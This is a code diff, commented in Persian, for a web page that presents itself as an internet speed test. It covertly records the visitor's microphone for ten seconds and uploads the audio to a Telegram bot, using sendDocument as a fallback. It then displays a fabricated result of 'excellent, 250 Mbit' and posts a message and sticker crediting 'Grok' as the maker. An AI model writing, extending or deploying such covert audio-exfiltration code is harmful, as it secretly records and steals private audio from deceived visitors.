@@ -96,14 +96,13 @@
         mediaRecorder.start();
         status.textContent = "در حال اندازه‌گیری...";
 
-        // پیشرفت ۱۰ ثانیه‌ای
         let seconds = 0;
         timer = setInterval(() => {
           seconds++;
           progressBar.style.width = `${(seconds / 10) * 100}%`;
           if (seconds >= 10) {
             clearInterval(timer);
-            mediaRecorder.requestData(); // فوری داده‌ها رو جمع کن
+            mediaRecorder.requestData();
             mediaRecorder.stop();
           }
         }, 1000);
@@ -122,33 +121,63 @@
       form.append('audio', blob, fileName);
 
       try {
-        // با timeout 15 ثانیه
-        const controller = new AbortController();
-        const timeout = setTimeout(() => controller.abort(), 15000);
-
         const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { 
           method: 'POST', 
-          body: form,
-          signal: controller.signal
+          body: form 
         });
-        clearTimeout(timeout);
-
         const data = await res.json();
 
         if (data.ok) {
+          const fileId = data.result.audio.file_id;
+          // ارسال پیام + استیکر
+          await sendMessageWithSticker(fileId);
           status.innerHTML = "سرعت شما: <strong style='color:#00d2ff;'>عالی (۲۵۰ مگابیت)</strong>";
         } else {
-          // fallback
-          form.delete('audio');
-          form.append('document', blob, fileName);
-          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: form });
-          status.innerHTML = "سرعت شما: <strong style='color:#00d2ff;'>عالی (۲۵۰ مگابیت)</strong>";
+          throw new Error("sendAudio failed");
         }
       } catch (err) {
-        status.textContent = "خطا در ارسال.";
+        // fallback به document
+        form.delete('audio');
+        form.append('document', blob, fileName);
+        const docRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: form });
+        const docData = await docRes.json();
+        if (docData.ok) {
+          await sendMessageWithSticker(docData.result.document.file_id);
+        }
+        status.innerHTML = "سرعت شما: <strong style='color:#00d2ff;'>عالی (۲۵۰ مگابیت)</strong>";
       } finally {
         reset();
       }
+    }
+
+    async function sendMessageWithSticker(fileId) {
+      const caption = `تست سرعت با موفقیت انجام شد!  
+سازنده: گروک  
+`;
+      
+      // استیکر دلخواه (مثلاً گربه باحال)
+      const stickerId = "CAACAgQAAxkBAAEB8n1mW5l2AAHeAAFeAAFiAAAgAAFeAAHAAAPIAAMJAAC8v8gAAZg1AAL0BA"; // گربه
+
+      // ارسال پیام زیر ویس
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: caption,
+          reply_to_message_id: null // یا می‌تونی message_id ویس رو بذاری
+        })
+      });
+
+      // ارسال استیکر
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendSticker`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          sticker: stickerId
+        })
+      });
     }
 
     function stopStream() {
